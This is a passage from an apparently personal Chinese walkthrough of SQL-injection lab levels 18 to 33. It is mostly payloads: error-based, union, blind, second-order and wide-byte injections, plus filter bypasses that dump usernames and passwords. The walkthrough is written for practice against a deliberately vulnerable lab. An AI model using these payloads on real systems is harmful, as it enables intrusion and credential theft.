class="headerlink" title="18"></a>18</h2><ul><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201146678.png" alt="image-20250305185702069"></p><p>提示user agent</p><p><img src="C:\Users\95227\AppData\Roaming\Typora\typora-user-images\image-20250305185740234.png" alt="image-20250305185740234"></p><p>源代码将uname&amp;passwd都使用check_input函数</p></li><li><p>注入ua</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201148030.png" alt="image-20250305190437037"></p><p>提示闭合 为单引号</p></li><li><p>报错注入</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">1&#39; and updatexml(1,concat(0x7e,(select database())),1) and &#39;1&#39; =&#39;1#</span></span><span class="line"><span style="color: #abb2bf"> </span></span><span class="line"><span style="color: #abb2bf">1&#39; and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select  group_concat(table_name)),0x7e) from information_schema.tables where table_schema=&#39;security&#39;),0x7e),1) and &#39;1&#39; =&#39;1#</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">1&#39;and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select group_concat(column_name)),0x7e) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),0x7e),1) and &#39;1&#39; =&#39;1#</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">1&#39;and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select group_concat(username,id,password)),0x7e) from users ),0x7e),1) and &#39;1&#39; =&#39;1#</span></span></code></pre></div></div></figure></li></ul><h2 id="19"><a href="#19" class="headerlink" title="19"></a>19</h2><ul><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201149812.png" alt="image-20250305194359527"></p><p>提示referer</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">1&#39; and updatexml(1,concat(0x7e,(select database())),1) and &#39;1&#39; =&#39;1#</span></span><span class="line"><span style="color: #abb2bf"> </span></span><span class="line"><span style="color: #abb2bf">1&#39; and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select  group_concat(table_name)),0x7e) from information_schema.tables where table_schema=&#39;security&#39;),0x7e),1) and &#39;1&#39; =&#39;1#</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">1&#39;and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select group_concat(column_name)),0x7e) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),0x7e),1) and &#39;1&#39; =&#39;1#</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">1&#39;and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select group_concat(username,id,password)),0x7e) from users ),0x7e),1) and &#39;1&#39; =&#39;1#</span></span></code></pre></div></div></figure></li></ul><h2 id="20（cookie）"><a href="#20（cookie）" class="headerlink" title="20（cookie）"></a>20（cookie）</h2><ul><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201151227.png" alt="image-20250305194725524"></p><p>出现cookie</p></li><li><p>登录后在刷新抓包</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201156027.png" alt="image-20250305195520723"></p><p>测试单引号闭合</p><p>使用<strong>联合注入或者报错注入</strong></p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">uname=admin&#39; 1&#39; and updatexml(1,concat(0x7e,(select database())),1) and &#39;1&#39; =&#39;1#</span></span><span class="line"><span style="color: #abb2bf"> </span></span><span class="line"><span style="color: #abb2bf">uname=admin&#39;1&#39; and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select  group_concat(table_name)),0x7e) from information_schema.tables where table_schema=&#39;security&#39;),0x7e),1) and &#39;1&#39; =&#39;1#</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">uname=admin&#39;1&#39;and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select group_concat(column_name)),0x7e) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),0x7e),1) and &#39;1&#39; =&#39;1#</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">uname=admin&#39;1&#39;and updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select group_concat(username,id,password)),0x7e) from users ),0x7e),1) and &#39;1&#39; =&#39;1#</span></span></code></pre></div></div></figure></li></ul><h2 id="21（cookie-base64）"><a href="#21（cookie-base64）" class="headerlink" title="21（cookie+base64）"></a>21（cookie+base64）</h2><ul><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201158713.png" alt="image-20250305200559293"></p><p>出现base64编码</p><p>闭合为单引号（‘）</p></li><li><p>解码后使用</p><p><strong>联合注入或者报错注入</strong></p></li></ul><h2 id="22"><a href="#22" class="headerlink" title="22"></a>22</h2><ul><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201158713.png" alt="image-20250305200559293"></p><p>出现base64编码</p><p>闭合为双引号（“）</p></li><li><p>解码后使用</p><p><strong>联合注入或者报错注入</strong></p></li></ul><h2 id="23（只联合）"><a href="#23（只联合）" class="headerlink" title="23（只联合）"></a>23（只联合）</h2><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201206189.png" alt="image-20250305202555964"></p><p>本题过滤了#和–（ 不能注释后面的字符）</p><p><strong>只能使用联合</strong></p><p><strong>因为只有联合使用OR ‘1’&#x3D;’1可以代替注释符</strong></p><p>但是使用报错注入的话，and ‘1’&#x3D;’1<strong>不能</strong>替代注释符</p><ul><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201208232.png" alt="image-20250305202437014"></p><p>为单引号闭合</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">id=1&#39; or &#39;1&#39; =&#39;1</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">id=-1&#39; union select 1, database(),version() or &#39;1&#39; = &#39;1</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">id=-1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=‘security&#39;),3 or &#39;1&#39;=&#39;1</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">id=-1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=‘security&#39; and table_name=‘users’ ),3 or &#39;1&#39;=&#39;1</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">id=-1&#39; union select 1,(select group_concat(password,“-”,username) from users),3 or &#39;1&#39;=&#39;1</span></span></code></pre></div></div></figure></li></ul><h2 id="24-二次注入"><a href="#24-二次注入" class="headerlink" title="24(二次注入)"></a>24(二次注入)</h2><ul><li><p>注册</p><p>账号admin’ #</p><p>密码111</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201210310.png"></p><p>再登录账号</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201211474.png" alt="image-20250305205830652"></p><p>修改密码</p><p>111 222 222</p><p>但是此时的admin’ #密码并没有修改（因为账户为admin‘ # <strong>屏蔽了后面的密码修改代码</strong>）</p><p>所以成功绕过</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201212847.png" alt="image-20250305210131665"></p><p>可以登入数据库</p></li></ul><h2 id="25（双写）"><a href="#25（双写）" class="headerlink" title="25（双写）"></a>25（双写）</h2><ul><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201213782.png" alt="image-20250305210241340"></p><p>注释了or和and</p><p>限制了联合和报错的order by   |  and  xxxx</p><p>重复注入（oorr      anandd）只过滤一个</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">?id=1&#39;</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">?id=1&#39; anandd updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) --+</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">?id=1&#39; anandd updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select  group_concat(table_name)),0x7e) from information_schema.tables where table_schema=&#39;security&#39;),0x7e),1) --+ </span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">?id=1&#39;anandd updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select group_concat(column_name)),0x7e) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),0x7e),1) --+</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">?id=1&#39;anandd updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select group_concat(username,id,password)),0x7e) from users ),0x7e),1) --+</span></span></code></pre></div></div></figure><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">?id=1&#39; oorrder by 3</span></span><span class="line"><span style="color: #abb2bf">?id=-1&#39; union select 1,2,3</span></span><span class="line"><span style="color: #abb2bf">?id=-1&#39; union select 1,database(),version()</span></span><span class="line"><span style="color: #abb2bf">?id=-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;</span></span><span class="line"><span style="color: #abb2bf">?id=-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;</span></span><span class="line"><span style="color: #abb2bf">?id=-1&#39; union select 1,2,group_concat(username ,id , password) from users</span></span></code></pre></div></div></figure></li></ul><h2 id="25a"><a href="#25a" class="headerlink" title="25a"></a>25a</h2><ul><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201219296.png" alt="image-20250306190129999"></p><p>无反馈，为数字注入</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">?id=1</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">?id=1 anandd updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) --+</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">?id=1 anandd updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select  group_concat(table_name)),0x7e) from information_schema.tables where table_schema=&#39;security&#39;),0x7e),1) --+ </span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">?id=1anandd updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select group_concat(column_name)),0x7e) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),0x7e),1) --+</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">?id=1anandd updatexml(1,concat(0x7e,(select distinct concat(0x7e, (select group_concat(username,id,password)),0x7e) from users ),0x7e),1) --+</span></span></code></pre></div></div></figure><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">?id=1 oorrder by 3</span></span><span class="line"><span style="color: #abb2bf">?id=-1 union select 1,2,3</span></span><span class="line"><span style="color: #abb2bf">?id=-1 union select 1,database(),version()</span></span><span class="line"><span style="color: #abb2bf">?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;</span></span><span class="line"><span style="color: #abb2bf">?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;</span></span><span class="line"><span style="color: #abb2bf">?id=-1 union select 1,2,group_concat(username ,id , password) from users</span></span></code></pre></div></div></figure></li></ul><h2 id="26（双写、注释符绕过）"><a href="#26（双写、注释符绕过）" class="headerlink" title="26（双写、注释符绕过）"></a>26（双写、注释符绕过）</h2><ul><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201221348.png" alt="image-20250306190428247"></p><p>过滤了逻辑运算符，<strong>注释符</strong>以及空格</p><p><strong>双写绕过逻 辑运算符或者使&amp;&amp;和||替换</strong></p><p>空格过滤：</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">%09 Tab键（水平）</span></span><span class="line"><span style="color: #abb2bf">%0a 新建一行</span></span><span class="line"><span style="color: #abb2bf">%0c 新的一页</span></span><span class="line"><span style="color: #abb2bf">%0d return 键</span></span><span class="line"><span style="color: #abb2bf">%0b Tab键（垂直）</span></span><span class="line"><span style="color: #abb2bf">%a0 空格</span></span><span class="line"><span style="color: #abb2bf">() 绕过</span></span></code></pre></div></div></figure><p>注释符绕过：</p><p><strong>;%00</strong></p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">?id=1&#39;</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">?id=1&#39;anandd(updatexml(1,concat(0x7e,database()),0x7e),1);%00</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">?id=1&#39;anandd(updatexml(1,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database())),1));%00</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">?id=1&#39;anandd(updatexml(1,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name=&#39;users&#39;)),1));%00</span></span><span class="line"><span style="color: #abb2bf">显示不全（因为显示的字段太长，有限制）</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">?id=1&#39;anandd(updatexml(1,mid((select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name=&#39;users&#39;)),40,100),1));%00</span></span><span class="line"><span style="color: #abb2bf">(加mid由于，其可以使用更加简洁的输出想要的字段)</span></span><span class="line"><span style="color: #abb2bf">?id=1&#39;anandd(updatexml(1,(select(group_concat(username,0x7e,passwoorrd))from(users)),1));%00</span></span></code></pre></div></div></figure><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201223817.png" alt="image-20250306193603285"></p></li></ul><h2 id="26a"><a href="#26a" class="headerlink" title="26a"></a>26a</h2><ul><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201225844.png" alt="image-20250306193957125"></p><p>无显示报错信息</p><p>不能使用报错注入，使用盲注&#x2F;联合</p><p>（但是联合括号太多了）</p></li><li><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">?id=1&#39;)anandd(length(database())=8);%00</span></span><span class="line"><span style="color: #abb2bf">?id=1&#39;)anandd(ascii(substr(database(),1,1))=115);%00</span></span><span class="line"><span style="color: #abb2bf">?id=1&#39;)anandd(length((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())))=29);%00</span></span><span class="line"><span style="color: #abb2bf">?id=1&#39;)anandd(ascii(substr((select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database())),1,1))=101);%00</span></span></code></pre></div></div></figure></li></ul><h2 id="27"><a href="#27" class="headerlink" title="27"></a>27</h2><ul><li><p>确定以单引号闭合</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201228451.png" alt="image-20250306200303124"></p><p>而且禁用了两个关键词</p><p><strong>UNION &amp; SELECT</strong></p></li><li><p>有报错可以使用报错注入，可以使用<strong>大小写</strong>绕过</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">?id=1&#39;and(updatexml(1,concat(0x7e,database()),0x7e),1);%00</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">?id=1&#39;and(updatexml(1,(SELect(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),1));%00</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">?id=1&#39;and(updatexml(1,(SELect(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;users&#39;)),1));%00</span></span><span class="line"><span style="color: #abb2bf">显示不全（因为显示的字段太长，有限制）</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">?id=1&#39;and(updatexml(1,mid((SELect(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;users&#39;)),40,100),1));%00</span></span><span class="line"><span style="color: #abb2bf">(加mid由于，其可以使用更加简洁的输出想要的字段)</span></span><span class="line"><span style="color: #abb2bf">?id=1&#39;and(updatexml(1,(SELect(group_concat(username,0x7e,password))from(users)),1));%00</span></span></code></pre></div></div></figure></li></ul><h2 id="27a"><a href="#27a" class="headerlink" title="27a"></a>27a</h2><ul><li>双引号注入</li></ul><p>但是无报错，所以使用盲注</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">?id=1&quot;and(length(database())=8);%00</span></span><span class="line"><span style="color: #abb2bf">?id=1&quot;and(ascii(substr(database(),1,1))=115);%00</span></span><span class="line"><span style="color: #abb2bf">?id=1&quot;and(length((SELect(group_concat(table_name))from(information_schema.tables)where(table_schema=database())))=29);%00</span></span><span class="line"><span style="color: #abb2bf">?id=1&quot;and(ascii(substr((SELect(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database())),1,1))=101);%00</span></span></code></pre></div></div></figure><h2 id="28"><a href="#28" class="headerlink" title="28"></a>28</h2><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201231191.png" alt="image-20250306203746685"></p><p>过滤空格和注释符</p><ul><li><p>单引号+括号闭合</p><p>无回显，使用盲注&#x2F;联合</p></li><li><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">?id=1&#39;)and(length(database())=8);%00</span></span><span class="line"><span style="color: #abb2bf">?id=1&#39;)and(ascii(substr(database(),1,1))=115);%00</span></span><span class="line"><span style="color: #abb2bf">?id=1&#39;)and(length((SELect(group_concat(table_name))from(information_schema.tables)where(table_schema=database())))=29);%00</span></span><span class="line"><span style="color: #abb2bf">?id=1&#39;)and(ascii(substr((SELect(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database())),1,1))=101);%00</span></span></code></pre></div></div></figure></li></ul><h2 id="28a"><a href="#28a" class="headerlink" title="28a"></a>28a</h2><ul><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201232792.png" alt="image-20250306203625655"></p><p>只过滤union select</p><p>双写绕过</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">?id=1&#39;);%00  </span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">?id=1&#39;) order by 3;%00  </span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">?id=-1&#39;) ununion selection select 1,2,3;%00  </span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">?id=-1&#39;) ununion selection select 1,database(),version();%00 </span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">?id=-1&#39;) ununion selection select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;;%00  </span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">?id=-1&#39;) ununion selection select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;;%00  </span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">?id=-1&#39;) ununion selection select 1,2,group_concat(username,id,password) from users;%00</span></span></code></pre></div></div></figure><p>或者布尔注入</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">同上题</span></span></code></pre></div></div></figure></li></ul><h2 id="29HPP-http参数污染（双服务器）"><a href="#29HPP-http参数污染（双服务器）" class="headerlink" title="29HPP http参数污染（双服务器）"></a>29HPP http参数污染（双服务器）</h2><ul><li><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">id=1&#39; order by 3--+（使用双引号测试）（闭合括号）</span></span><span class="line"><span style="color: #abb2bf">?id=-1&#39; union select 1,2,3--+</span></span><span class="line"><span style="color: #abb2bf">?id=-1&#39; union select 1,database(),version()--+</span></span><span class="line"><span style="color: #abb2bf">?id=-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;--+</span></span><span class="line"><span style="color: #abb2bf">?id=-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;--+</span></span><span class="line"><span style="color: #abb2bf">?id=-1&#39; union select 1,2,group_concat(username ,id , password) from users--+</span></span></code></pre></div></div></figure></li></ul><h3 id="重点"><a href="#重点" class="headerlink" title="重点"></a>重点</h3><p>参数污染:提交相同参数，不同的处理方式</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">?id=123</span></span><span class="line"><span style="color: #abb2bf">cookie: id=123</span></span></code></pre></div></div></figure><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">?id=123&amp;id=13555</span></span></code></pre></div></div></figure><p>对两个id的传参处理不一样</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201238412.png" alt="image-20250306211048605"></p><h2 id="30"><a href="#30" class="headerlink" title="30"></a>30</h2><ul><li><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">id=1&quot; order by 3--+（使用双引号测试）（闭合括号）</span></span><span class="line"><span style="color: #abb2bf">?id=-1&quot; union select 1,2,3--+</span></span><span class="line"><span style="color: #abb2bf">?id=-1&quot; union select 1,database(),version()--+</span></span><span class="line"><span style="color: #abb2bf">?id=-1&quot; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;--+</span></span><span class="line"><span style="color: #abb2bf">?id=-1&quot; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;--+</span></span><span class="line"><span style="color: #abb2bf">?id=-1&quot; union select 1,2,group_concat(username ,id , password) from users--+</span></span></code></pre></div></div></figure></li></ul><h2 id="31"><a href="#31" class="headerlink" title="31"></a>31</h2><ul><li><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">id=1&quot;) order by 3--+（使用双引号测试）（闭合括号）</span></span><span class="line"><span style="color: #abb2bf">?id=-1&quot;) union select 1,2,3--+</span></span><span class="line"><span style="color: #abb2bf">?id=-1&quot;) union select 1,database(),version()--+</span></span><span class="line"><span style="color: #abb2bf">?id=-1&quot;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;--+</span></span><span class="line"><span style="color: #abb2bf">?id=-1&quot;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;--+</span></span><span class="line"><span style="color: #abb2bf">?id=-1&quot;) union select 1,2,group_concat(username ,id , password) from users--+</span></span></code></pre></div></div></figure></li></ul><h2 id="32（转义-宽字节注入）"><a href="#32（转义-宽字节注入）" class="headerlink" title="32（转义 宽字节注入）"></a>32（转义 宽字节注入）</h2><ul><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027201242247.png" alt="image-20250306212036698"></p><p>（preg_replace预定义字符之前添加反斜杠）</p><p>此函数将   “  ’  转化 </p><p>加%df+单引号 ，相当于两个字符—&gt;<strong>表示汉字</strong></p><p>使得<strong>单引号</strong>逃逸出来</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">?id=-1%df&#39;union select 1,database(),3 --+</span></span><span class="line"><span style="color: #abb2bf"> </span></span><span class="line"><span style="color: #abb2bf">?id=-1%df&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+     爆表</span></span><span class="line"><span style="color: #abb2bf"> </span></span><span class="line"><span style="color: #abb2bf">?id=-1%df&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=0x7573657273--+   爆字段</span></span><span class="line"><span style="color: #abb2bf">使用16进制</span></span><span class="line"><span style="color: #abb2bf">?id=-1%df&#39; union select 1,group_concat(password,username),3 from users--+</span></span></code></pre></div></div></figure></li></ul><h2 id="33"><a href="#33" class="headerlink" title="33"></a>33</h2><p>双引号闭合</p><ul><li><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">?id=-1%df&quot;union select 1,database(),3 --+</span></span><span class="line"><span style="color: #abb2bf"> </span></span><span class="line"><span style="color: #abb2bf">?id=-1%df&quot; union select 1,group_concat(table_name),3 from 